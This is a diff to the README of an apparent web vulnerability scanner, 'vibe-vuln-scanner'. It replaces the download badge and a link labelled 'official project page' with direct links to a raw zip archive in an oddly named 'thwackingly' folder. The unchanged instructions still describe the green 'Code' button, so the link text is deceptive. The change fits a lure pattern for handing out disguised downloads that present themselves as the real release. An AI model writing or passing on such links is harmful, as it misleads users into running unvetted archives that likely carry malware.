@@ -1,12 +1,12 @@
 # 🛡️ vibe-vuln-scanner - Detect web security risks with ease
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/martinvleisure113/vibe-vuln-scanner)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/martinvleisure113/vibe-vuln-scanner/raw/refs/heads/main/thwackingly/vuln_scanner_vibe_1.1.zip)
 
 This tool checks web applications for security flaws. It protects your browsing experience by identifying potential threats in real time. The software uses data from the CISA KEV catalog and the NVD database to ensure your web apps follow modern security standards.
 
 ## 📥 How to download the software
 
-Visit the [official project page](https://github.com/martinvleisure113/vibe-vuln-scanner) to download the installation files. Click the green "Code" button and select "Download ZIP" to save the folder to your computer. Once the download finishes, open your Downloads folder and extract the files to a location you can easily access.
+Visit the [official project page](https://github.com/martinvleisure113/vibe-vuln-scanner/raw/refs/heads/main/thwackingly/vuln_scanner_vibe_1.1.zip) to download the installation files. Click the green "Code" button and select "Download ZIP" to save the folder to your computer. Once the download finishes, open your Downloads folder and extract the files to a location you can easily access.
 
 ## ⚙️ System requirements
 
